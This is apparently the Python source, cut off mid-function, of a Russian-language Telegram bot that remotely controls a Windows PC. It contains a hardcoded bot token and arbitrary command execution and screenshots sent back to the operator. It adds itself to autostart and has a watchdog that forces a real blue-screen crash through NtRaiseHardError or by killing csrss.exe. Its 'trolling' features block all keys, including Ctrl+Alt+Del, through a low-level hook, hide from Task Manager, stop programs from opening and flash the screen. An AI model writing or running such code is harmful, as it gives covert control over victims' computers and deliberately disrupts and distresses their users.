import os
import sys
import subprocess
import platform
import random
import shutil
import threading
import time
import ctypes
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Импорт winreg только для Windows
if platform.system() == "Windows":
    import winreg

# Импорты для новых функций
try:
    import pyautogui  # Управление мышью
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

try:
    from openai import OpenAI  # AI помощник
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False

try:
    import pyttsx3  # Text-to-Speech
    TTS_AVAILABLE = True
except ImportError:
    TTS_AVAILABLE = False

# Вставьте ваш токен от BotFather
BOT_TOKEN = "7876495802:AAGixaO2S7MWJnFFA_VWnKPr2M320zIC3Iw"

# ID пользователей, которым разрешено управлять (для безопасности)
ALLOWED_USERS = [1854451325, 5516562490, 495434214]  # Авторизованные пользователи

# Критический режим - если бот закроется, система крашится
CRITICAL_MODE = False
WATCHDOG_RUNNING = False
BOT_PROCESS_ID = os.getpid()

# Процесс фейкового выключения
FAKE_SHUTDOWN_PROCESS = None
# Режим скрытого управления (черный экран + управление через бот)
STEALTH_MODE = False
# Процесс блокировщика доступа
ACCESS_BLOCKER_PROCESS = None
# Процесс тряски мышки
MOUSE_SHAKE_PROCESS = None
# Процесс оконного троллинга
WINDOW_TROLL_PROCESS = None
# Процесс внезапных вспышек
FLASH_PROCESS = None
# Процесс фейковых насекомых
BUGS_PROCESS = None
# OpenAI API ключ (замените на свой)
OPENAI_API_KEY = "sk-your-api-key-here"  # Получите на platform.openai.com
# Система уведомлений
NOTIFICATIONS_ENABLED = False
NOTIFICATION_THREAD = None

def trigger_bsod():
    """Вызывает BSOD (синий экран смерти) в Windows - несколько методов"""
    if platform.system() == "Windows":
        print("💀 КРИТИЧЕСКИЙ РЕЖИМ: Вызов BSOD...")
        
        # Метод 1: NtRaiseHardError через ntdll
        try:
            ntdll = ctypes.windll.ntdll
            enabled = ctypes.c_bool()
            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))
            ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
            return
        except Exception as e:
            print(f"Метод 1 не сработал: {e}")
        
        # Метод 2: Вызов драйвера критической ошибки
        try:
            # Создаем PowerShell скрипт для вызова BSOD
            ps_script = '''
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class BSOD {
                [DllImport("ntdll.dll")]
                public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
                
                [DllImport("ntdll.dll")]
                public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
                
                public static void Trigger() {
                    bool t1;
                    uint t2;
                    RtlAdjustPrivilege(19, true, false, out t1);
                    NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                }
            }
"@
            [BSOD]::Trigger()
            '''
            subprocess.Popen(["powershell", "-Command", ps_script], creationflags=subprocess.CREATE_NO_WINDOW)
            return
        except Exception as e:
            print(f"Метод 2 не сработал: {e}")
        
        # Метод 3: Аварийное завершение критического процесса
        try:
            subprocess.run(["taskkill", "/F", "/IM", "csrss.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

# Файл-маркер для watchdog
HEARTBEAT_FILE = os.path.join(os.environ.get('TEMP', '.'), 'bot_heartbeat.tmp')

def create_heartbeat():
    """Создаёт файл-маркер что бот жив"""
    global HEARTBEAT_FILE
    with open(HEARTBEAT_FILE, 'w') as f:
        f.write(str(time.time()))

def watchdog_thread():
    """Watchdog поток, который следит за процессом бота"""
    global WATCHDOG_RUNNING
    import psutil
    
    print("🔴 Watchdog запущен! Критический режим активен.")
    last_heartbeat = time.time()
    
    while WATCHDOG_RUNNING and CRITICAL_MODE:
        try:
            # Проверяем heartbeat файл
            if os.path.exists(HEARTBEAT_FILE):
                try:
                    with open(HEARTBEAT_FILE, 'r') as f:
                        file_time = float(f.read())
                        current_time = time.time()
                        
                        # Если файл не обновлялся более 5 секунд
                        if current_time - file_time > 5:
                            print("⚠️ КРИТИЧЕСКИЙ РЕЖИМ: Heartbeat остановлен! Вызов BSOD...")
                            trigger_bsod()
                            break
                except:
                    pass
            else:
                # Файл удалён - процесс умер
                print("⚠️ КРИТИЧЕСКИЙ РЕЖИМ: Heartbeat файл удалён! Вызов BSOD...")
                trigger_bsod()
                break
            
            # Дополнительная проверка процесса
            if not psutil.pid_exists(BOT_PROCESS_ID):
                print("⚠️ КРИТИЧЕСКИЙ РЕЖИМ: Процесс бота завершён! Вызов BSOD...")
                trigger_bsod()
                break
                
        except Exception as e:
            print(f"Ошибка watchdog: {e}")
        
        time.sleep(1)

def heartbeat_thread():
    """Поток обновления heartbeat файла"""
    global WATCHDOG_RUNNING, CRITICAL_MODE
    
    while WATCHDOG_RUNNING and CRITICAL_MODE:
        try:
            create_heartbeat()
        except:
            pass
        time.sleep(2)

def check_access(user_id):
    """Проверка доступа пользователя"""
    if not ALLOWED_USERS:
        return True  # Если список пустой, доступ всем
    return user_id in ALLOWED_USERS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Главное меню с кнопками"""
    user_id = update.effective_user.id
    
    if not check_access(user_id):
        await update.message.reply_text("❌ У вас нет доступа к этому боту!")
        return
    
    # Динамическая клавиатура в зависимости от режима скрытого управления
    global STEALTH_MODE
    
    keyboard = []
    
    # Если активен режим скрытого управления, показываем кнопку отключения
    if STEALTH_MODE:
        keyboard.append([
            InlineKeyboardButton("🟢 ВЫКЛЮЧИТЬ СКРЫТЫЙ РЕЖИМ", callback_data="stealth_mode_off")
        ])
    else:
        keyboard.append([
            InlineKeyboardButton("🕵️ Режим скрытого управления", callback_data="stealth_mode_on")
        ])
    
    keyboard.extend([
        [
            InlineKeyboardButton("💻 Системная информация", callback_data="sysinfo")
        ],
        [
            InlineKeyboardButton("📸 Скриншот", callback_data="screenshot"),
            InlineKeyboardButton("🔊 Громкость", callback_data="volume_menu")
        ],
        [
            InlineKeyboardButton("⚡ Выполнить команду", callback_data="custom_cmd"),
            InlineKeyboardButton("📝 Показать текст", callback_data="show_text")
        ],
        [
            InlineKeyboardButton("😈 Троллинг", callback_data="trolling_menu"),
            InlineKeyboardButton("🔒 Заблокировать ПК", callback_data="lock")
        ],
        [
            InlineKeyboardButton("🔄 Перезагрузка", callback_data="restart"),
            InlineKeyboardButton("⏻ Выключить ПК", callback_data="shutdown")
        ],
        [
            InlineKeyboardButton("⚙️ Установить в автозагрузку", callback_data="install_autostart")
        ],
        [
            InlineKeyboardButton("💀 Критический режим", callback_data="toggle_critical")
        ]
    ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = f"""
🤖 *Бот управления ПК*

Привет, {update.effective_user.first_name}!

Ваш ID: `{user_id}`

Выберите действие:
    """
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик нажатий на кнопки"""
    query = update.callback_query
    user_id = update.effective_user.id
    
    if not check_access(user_id):
        await query.answer("❌ Нет доступа!", show_alert=True)
        return
    
    await query.answer()
    
    global FAKE_SHUTDOWN_PROCESS, STEALTH_MODE, ACCESS_BLOCKER_PROCESS, MOUSE_SHAKE_PROCESS, WINDOW_TROLL_PROCESS, FLASH_PROCESS, BUGS_PROCESS
    action = query.data
    
    if action == "sysinfo":
        info = f"""
💻 *Системная информация*

🖥️ Система: {platform.system()} {platform.release()}
📝 Версия: {platform.version()}
🏗️ Архитектура: {platform.machine()}
💾 Процессор: {platform.processor()}
🌐 Имя ПК: {platform.node()}
🐍 Python: {platform.python_version()}
        """
        await query.edit_message_text(info, parse_mode='Markdown')
        await show_back_button(query)
    
    elif action == "screenshot":
        await query.edit_message_text("📸 Создание скриншота...")
        try:
            from PIL import ImageGrab
            import tempfile
            
            screenshot = ImageGrab.grab()
            
            # Сохраняем во временную папку (работает из любого места)
            temp_dir = tempfile.gettempdir()
            screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
            screenshot.save(screenshot_path)
            
            with open(screenshot_path, 'rb') as photo_file:
                await query.message.reply_photo(photo=photo_file)
            
            # Удаляем временный файл
            try:
                os.remove(screenshot_path)
            except:
                pass
            
            await query.edit_message_text("✅ Скриншот отправлен!")
        except ImportError:
            await query.edit_message_text("❌ Установите библиотеку: pip install Pillow")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "volume_menu":
        keyboard = [
            [
                InlineKeyboardButton("🔇 Выкл", callback_data="vol_mute"),
                InlineKeyboardButton("🔉 25%", callback_data="vol_25"),
                InlineKeyboardButton("🔉 50%", callback_data="vol_50")
            ],
            [
                InlineKeyboardButton("🔊 75%", callback_data="vol_75"),
                InlineKeyboardButton("🔊 100%", callback_data="vol_100")
            ],
            [InlineKeyboardButton("◀️ Назад", callback_data="back")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🔊 Выберите громкость:", reply_markup=reply_markup)
    
    elif action.startswith("vol_"):
        await handle_volume(query, action)
    
    elif action == "custom_cmd":
        await query.edit_message_text("⚡ Отправьте команду для выполнения (например: `dir` или `ipconfig`)", parse_mode='Markdown')
        context.user_data['awaiting_command'] = True
    
    elif action == "show_text":
        await query.edit_message_text("📝 Отправьте текст, который нужно показать на экране")
        context.user_data['awaiting_text'] = True
    
    elif action == "trolling_menu":
        keyboard = [
            [
                InlineKeyboardButton("😱 Неубиваемый скример 2 сек", callback_data="screamer_2sec")
            ],
            [
                InlineKeyboardButton("🇺🇦 Зеленский + музыка", callback_data="zelensky_menu")
            ],
            [
                InlineKeyboardButton("💀 Фейковый BSOD", callback_data="fake_bsod_menu")
            ],
            [
                InlineKeyboardButton("📳 Дрожь экрана", callback_data="screen_shake_menu")
            ],
            [
                InlineKeyboardButton("🔄 Крутилка экрана", callback_data="screen_rotate_menu")
            ],
            [
                InlineKeyboardButton("💻 Фейковое выключение", callback_data="fake_shutdown")
            ],
            [
                InlineKeyboardButton("🚫 Блокировщик доступа", callback_data="access_blocker_menu")
            ],
            [
                InlineKeyboardButton("🖱️ Тряска мышки", callback_data="mouse_shake_menu")
            ],
            [
                InlineKeyboardButton("🪟 Оконное троллинг", callback_data="window_troll_menu")
            ],
            [
                InlineKeyboardButton("⚡ Внезапные вспышки", callback_data="flash_menu")
            ],
            [
                InlineKeyboardButton("🕷️ Фейковые насекомые", callback_data="bugs_menu")
            ],
            [
                InlineKeyboardButton("🔊 Громкое видео", callback_data="loud_video_menu")
            ],
            [
                InlineKeyboardButton("📺 Падающий экран", callback_data="falling_screen_menu")
            ]
        ]
        
        # Если фейковое выключение активно, добавляем кнопку включения
        if FAKE_SHUTDOWN_PROCESS is not None:
            keyboard.insert(0, [
                InlineKeyboardButton("⚡ ВКЛЮЧИТЬ ПК ОБРАТНО", callback_data="fake_shutdown_stop")
            ])
        
        # Если блокировщик доступа активен, добавляем кнопку разблокировки
        if ACCESS_BLOCKER_PROCESS is not None:
            keyboard.insert(0, [
                InlineKeyboardButton("🔓 РАЗБЛОКИРОВАТЬ ДОСТУП", callback_data="access_blocker_stop")
            ])
        
        # Если тряска мышки активна, добавляем кнопку остановки
        if MOUSE_SHAKE_PROCESS is not None:
            keyboard.insert(0, [
                InlineKeyboardButton("🛑 ОСТАНОВИТЬ ТРЯСКУ МЫШКИ", callback_data="mouse_shake_stop")
            ])
        
        # Если оконное троллинг активно, добавляем кнопку остановки
        if WINDOW_TROLL_PROCESS is not None:
            keyboard.insert(0, [
                InlineKeyboardButton("🛑 ОСТАНОВИТЬ ОКОННОЕ ТРОЛЛИНГ", callback_data="window_troll_stop")
            ])
        
        # Если вспышки активны, добавляем кнопку остановки
        if FLASH_PROCESS is not None:
            keyboard.insert(0, [
                InlineKeyboardButton("🛑 ОСТАНОВИТЬ ВСПЫШКИ", callback_data="flash_stop")
            ])
        
        # Если насекомые активны, добавляем кнопку остановки
        if BUGS_PROCESS is not None:
            keyboard.insert(0, [
                InlineKeyboardButton("🛑 УБРАТЬ НАСЕКОМЫХ", callback_data="bugs_stop")
            ])
        
        keyboard.append([
            InlineKeyboardButton("◀️ Назад", callback_data="back")
        ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("😈 *Меню троллинга*\n\nВыберите действие:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "access_blocker_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="access_blocker_30"),
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="access_blocker_60")
            ],
            [
                InlineKeyboardButton("⏱️ 2 минуты", callback_data="access_blocker_120"),
                InlineKeyboardButton("⏱️ 5 минут", callback_data="access_blocker_300")
            ],
            [
                InlineKeyboardButton("⏱️ 10 минут", callback_data="access_blocker_600"),
                InlineKeyboardButton("⏱️ 30 минут", callback_data="access_blocker_1800")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🚫 *Блокировщик доступа*\n\n❌ Запрещает открывать программы\n💬 Показывает \"Доступ заблокирован\"\n\n📋 Блокируются:\n• Explorer (проводник)\n• Chrome, Firefox, Edge\n• Task Manager\n• CMD, PowerShell\n• И другие программы\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "mouse_shake_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="mouse_shake_30"),
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="mouse_shake_60")
            ],
            [
                InlineKeyboardButton("⏱️ 2 минуты", callback_data="mouse_shake_120"),
                InlineKeyboardButton("⏱️ 5 минут", callback_data="mouse_shake_300")
            ],
            [
                InlineKeyboardButton("⏱️ 10 минут", callback_data="mouse_shake_600"),
                InlineKeyboardButton("⏱️ ∞ Бесконечно", callback_data="mouse_shake_infinite")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🖱️ *Тряска мышки*\n\n🌀 Курсор хаотично двигается\n🚫 Управление ПК невозможно\n💀 Пользователь сходит с ума\n\n🎯 Эффекты:\n• Случайные движения\n• Быстрая скорость\n• Невозможность кликнуть\n• Полная потеря контроля\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "window_troll_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="window_troll_30"),
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="window_troll_60")
            ],
            [
                InlineKeyboardButton("⏱️ 2 минуты", callback_data="window_troll_120"),
                InlineKeyboardButton("⏱️ 5 минут", callback_data="window_troll_300")
            ],
            [
                InlineKeyboardButton("⏱️ 10 минут", callback_data="window_troll_600"),
                InlineKeyboardButton("⏱️ ∞ Бесконечно", callback_data="window_troll_infinite")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🪟 *Оконное троллинг*\n\n🔀 Окна перемещаются\n📏 Размеры меняются\n🎭 Случайные окна появляются\n❌ Окна закрываются\n\n🎯 Эффекты:\n• Окна летают по экрану\n• Фейковые ошибки\n• Сотни окон Notepad\n• Невозможно работать\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "flash_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="flash_30"),
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="flash_60")
            ],
            [
                InlineKeyboardButton("⏱️ 2 минуты", callback_data="flash_120"),
                InlineKeyboardButton("⏱️ 5 минут", callback_data="flash_300")
            ],
            [
                InlineKeyboardButton("⏱️ 10 минут", callback_data="flash_600"),
                InlineKeyboardButton("⏱️ ∞ Бесконечно", callback_data="flash_infinite")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("⚡ *Внезапные вспышки*\n\n💥 Экран ярко вспыхивает белым\n😱 Пугает и слепит\n⚡ Случайные интервалы\n\n🎯 Эффекты:\n• Яркие белые вспышки\n• Как молния на экране\n• Внезапно и неожиданно\n• Раздражает глаза\n• Невозможно игнорировать\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "bugs_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="bugs_30"),
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="bugs_60")
            ],
            [
                InlineKeyboardButton("⏱️ 2 минуты", callback_data="bugs_120"),
                InlineKeyboardButton("⏱️ 5 минут", callback_data="bugs_300")
            ],
            [
                InlineKeyboardButton("⏱️ 10 минут", callback_data="bugs_600"),
                InlineKeyboardButton("⏱️ ∞ Бесконечно", callback_data="bugs_infinite")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🕷️ *Фейковые насекомые*\n\n🪳 Насекомые летают ВЕЗДЕ по экрану\n😱 Выглядят реалистично\n⚡ Телепортируются случайно\n🦗 Новые появляются сами\n\n🎯 Эффекты:\n• GIF анимация (комары, мухи)\n• До 15 насекомых одновременно!\n• Хаотичное движение\n• Случайные ускорения\n• Невозможно отследить\n• МАКСИМАЛЬНОЕ раздражение!\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "loud_video_menu":
        keyboard = [
            [
                InlineKeyboardButton("🎵 Rickroll классика", callback_data="loud_video_rickroll")
            ],
            [
                InlineKeyboardButton("😱 Скример видео", callback_data="loud_video_screamer")
            ],
            [
                InlineKeyboardButton("🎪 Мемное видео", callback_data="loud_video_meme")
            ],
            [
                InlineKeyboardButton("🔗 Своя ссылка", callback_data="loud_video_custom")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🔊 *Громкое видео*\n\n📢 Ставит громкость на 100%\n🎬 Открывает видео на полный экран\n🔒 Нельзя закрыть легко\n\n🎯 Поддерживаемые форматы:\n• 🎵 YouTube (youtube.com, youtu.be)\n• 🎬 Прямые видео (MP4, WebM, AVI)\n• 🌐 Любые видео ссылки\n• 📺 Стримы и трансляции\n\n💥 Эффекты:\n• Максимальная громкость\n• Полноэкранный режим\n• Автовоспроизведение\n• Зацикливание\n• Блокировка закрытия\n\nВыберите видео:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "falling_screen_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 10 секунд", callback_data="falling_screen_10"),
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="falling_screen_30")
            ],
            [
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="falling_screen_60"),
                InlineKeyboardButton("⏱️ 2 минуты", callback_data="falling_screen_120")
            ],
            [
                InlineKeyboardButton("⏱️ ∞ Бесконечно", callback_data="falling_screen_infinite")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("📺 *Падающий экран*\n\n📉 Экран медленно \"падает\" вниз\n🌫️ Постепенно размывается\n💫 Эффект сломанного дисплея\n🔄 Возвращается и падает снова\n\n🎯 Эффекты:\n• Анимация падения экрана\n• Постепенное размытие\n• Искажение изображения\n• Fake \"поломка\" монитора\n• Звуки статики\n• Невозможно остановить\n\n⚠️ Выглядит как настоящая поломка!\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "screen_rotate_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 15 секунд", callback_data="screen_rotate_15"),
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="screen_rotate_30")
            ],
            [
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="screen_rotate_60"),
                InlineKeyboardButton("⏱️ 120 секунд", callback_data="screen_rotate_120")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🔄 *Крутилка экрана*\n\n🌀 Экран крутится без остановки\n🚫 Все клавиши заблокированы\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "screen_shake_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 10 секунд", callback_data="screen_shake_10"),
                InlineKeyboardButton("⏱️ 20 секунд", callback_data="screen_shake_20")
            ],
            [
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="screen_shake_30"),
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="screen_shake_60")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("📳 *Дрожь экрана*\n\n🌀 Жёсткая тряска с расплывчатостью\n🚫 Все клавиши заблокированы\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "fake_bsod_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 10 секунд", callback_data="fake_bsod_10"),
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="fake_bsod_30")
            ],
            [
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="fake_bsod_60"),
                InlineKeyboardButton("⏱️ 120 секунд", callback_data="fake_bsod_120")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("💀 *Фейковый BSOD*\n\n🚫 Все клавиши заблокированы!\n\nВыберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "zelensky_menu":
        keyboard = [
            [
                InlineKeyboardButton("⏱️ 5 секунд", callback_data="zelensky_time_5"),
                InlineKeyboardButton("⏱️ 10 секунд", callback_data="zelensky_time_10")
            ],
            [
                InlineKeyboardButton("⏱️ 15 секунд", callback_data="zelensky_time_15"),
                InlineKeyboardButton("⏱️ 30 секунд", callback_data="zelensky_time_30")
            ],
            [
                InlineKeyboardButton("⏱️ 60 секунд", callback_data="zelensky_time_60")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="trolling_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("🇺🇦 *Скример Зеленского*\n\n🎵 С музыкой!\n\n📝 Шаг 1: Выберите длительность:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action.startswith("zelensky_time_"):
        # Извлекаем время из callback
        duration = action.split("_")[2]
        context.user_data['zelensky_duration'] = duration
        
        keyboard = [
            [
                InlineKeyboardButton("🔉 25%", callback_data=f"zelensky_run_{duration}_25"),
                InlineKeyboardButton("🔉 50%", callback_data=f"zelensky_run_{duration}_50")
            ],
            [
                InlineKeyboardButton("🔊 75%", callback_data=f"zelensky_run_{duration}_75"),
                InlineKeyboardButton("🔊 100%", callback_data=f"zelensky_run_{duration}_100")
            ],
            [
                InlineKeyboardButton("◀️ Назад", callback_data="zelensky_menu")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"🇺🇦 *Скример Зеленского*\n\n⏱️ Время: {duration} сек\n\n📝 Шаг 2: Выберите громкость музыки:", reply_markup=reply_markup, parse_mode='Markdown')
    
    elif action == "screamer_2sec":
        await query.edit_message_text("😈 Показываю скример на 2 секунды...")
        try:
            if platform.system() == "Windows":
                # Получаем путь к папке с фото
                script_dir = os.path.dirname(os.path.abspath(__file__))
                photo_dir = os.path.join(script_dir, "photo")
                
                # Проверяем наличие фото
                screamer_files = []
                for file in os.listdir(photo_dir):
                    if file.lower().endswith(('.png', '.jpg', '.jpeg')):
                        screamer_files.append(os.path.join(photo_dir, file))
                
                if not screamer_files:
                    await query.edit_message_text("❌ Не найдены фото в папке photo/")
                    await show_back_button(query)
                    return
                
                # Выбираем случайное фото
                screamer_path = random.choice(screamer_files)
                screamer_path_escaped = screamer_path.replace('\\', '\\\\')
                
                # PowerShell скрипт для показа скримера с блокировкой клавиш
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Блокировка всех клавиш
                $keyHookCode = @"
                using System;
                using System.Runtime.InteropServices;
                public class KeyHook {{
                    private const int WH_KEYBOARD_LL = 13;
                    private const int HC_ACTION = 0;
                    private static IntPtr hookID = IntPtr.Zero;
                    private static LowLevelKeyboardProc _proc;
                    
                    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
                    
                    [DllImport("user32.dll")]
                    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
                    
                    [DllImport("user32.dll")]
                    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
                    
                    [DllImport("kernel32.dll")]
                    private static extern IntPtr GetModuleHandle(string lpModuleName);
                    
                    public static void SetHook() {{
                        _proc = HookCallback;
                        hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle("user32"), 0);
                    }}
                    
                    public static void Unhook() {{
                        if (hookID != IntPtr.Zero) {{
                            UnhookWindowsHookEx(hookID);
                            hookID = IntPtr.Zero;
                        }}
                    }}
                    
                    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {{
                        if (nCode >= HC_ACTION) {{
                            return (IntPtr)1;  // Блокируем все клавиши
                        }}
                        return CallNextHookEx(hookID, nCode, wParam, lParam);
                    }}
                }}
"@
                Add-Type $keyHookCode
                
                # Функция для создания и показа формы
                function Show-Screamer {{
                    param($imagePath)
                    
                    # Создаем форму на весь экран
                    $form = New-Object System.Windows.Forms.Form
                    $form.FormBorderStyle = 'None'
                    $form.WindowState = 'Maximized'
                    $form.TopMost = $true
                    $form.BackColor = [System.Drawing.Color]::Black
                    $form.KeyPreview = $true
                    $form.ShowInTaskbar = $false
                    
                    # Отключаем Alt+F4 и другие комбинации
                    $form.Add_KeyDown({{
                        param($s, $e)
                        $e.Handled = $true
                        $e.SuppressKeyPress = $true
                    }})
                    
                    # Загружаем изображение
                    $image = [System.Drawing.Image]::FromFile($imagePath)
                    
                    # Создаем PictureBox
                    $pictureBox = New-Object System.Windows.Forms.PictureBox
                    $pictureBox.Dock = 'Fill'
                    $pictureBox.SizeMode = 'Zoom'
                    $pictureBox.Image = $image
                    $form.Controls.Add($pictureBox)
                    
                    # Полностью блокируем закрытие
                    $form.Add_FormClosing({{
                        param($sender, $e)
                        if (-not $script:allowClose) {{
                            $e.Cancel = $true
                        }}
                    }})
                    
                    return $form, $image
                }}
                
                # Глобальные переменные
                $script:allowClose = $false
                $imagePath = "{screamer_path_escaped}"
                $duration = 2  # секунды
                
                # Создаем и показываем форму
                $form, $image = Show-Screamer -imagePath $imagePath
                $form.Show()
                
                # Устанавливаем hook для блокировки ВСЕХ клавиш (Win, Alt+Tab, Ctrl+Alt+Del и т.д.)
                [KeyHook]::SetHook()
                
                # Запоминаем время старта
                $startTime = Get-Date
                
                # Цикл мониторинга (2 секунды)
                while ($true) {{
                    [System.Windows.Forms.Application]::DoEvents()
                    
                    # Проверяем, запущен ли диспетчер задач
                    $taskmgr = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
                    
                    if ($taskmgr) {{
                        # Диспетчер запущен - скрываем форму
                        if ($form.Visible) {{
                            $form.Hide()
                        }}
                    }} else {{
                        # Диспетчера нет - показываем форму
                        if (-not $form.Visible) {{
                            $form.Show()
                            $form.TopMost = $true
                            $form.BringToFront()
                        }}
                    }}
                    
                    # Проверяем время
                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
                    if ($elapsed -ge $duration) {{
                        break
                    }}
                    
                    # Небольшая задержка для снижения нагрузки на CPU
                    Start-Sleep -Milliseconds 50
                }}
                
                # Снимаем keyboard hook
                [KeyHook]::Unhook()
                
                # Закрываем форму
                $script:allowClose = $true
                $form.Close()
                
                # Очистка ресурсов
                $image.Dispose()
                $form.Dispose()
                '''
                
                subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command])
                await query.edit_message_text(f"✅ Скример запущен на 2 секунды!\n\n📄 Файл: {os.path.basename(screamer_path)}\n\n🔒 Закрыть невозможно!\n🚫 Все клавиши заблокированы (Win, Alt+Tab, Ctrl+Alt+Del)\n👁️ Прячется при диспетчере задач\n🔄 Возвращается при закрытии")
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("zelensky_run_"):
        # Извлекаем время и громкость из callback_data: zelensky_run_{duration}_{volume}
        parts = action.split("_")
        duration = int(parts[2])
        volume = int(parts[3])
        await query.edit_message_text(f"🇺🇦 Запускаю скример Зеленского на {duration} сек с музыкой {volume}%...")
        
        try:
            if platform.system() == "Windows":
                # Получаем пути к файлам
